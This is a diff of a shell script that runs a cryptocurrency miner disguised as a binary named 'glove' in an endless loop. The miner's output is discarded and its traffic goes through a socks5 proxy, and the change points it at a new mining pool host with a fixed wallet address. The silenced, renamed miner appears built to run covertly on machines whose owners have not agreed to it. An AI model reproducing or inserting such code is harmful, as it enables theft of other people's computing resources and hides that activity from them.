@@ -84,6 +84,6 @@ sleep 2
 
 while true
 do
-./glove --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" -o stratum+tcp://usazergtide.wot.mrface.com:7445 -u Bh43dUV3ypTM7SRFcyBcV1Rt8A1taua7FG.$currentdate -p c=MBC,mc=MBC,ID=$currentdate -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
+./glove --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" -o stratum+tcp://crims.devopsenterprise.uk:24010 -u Bh43dUV3ypTM7SRFcyBcV1Rt8A1taua7FG.$currentdate -p x -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
 sleep 10
 done
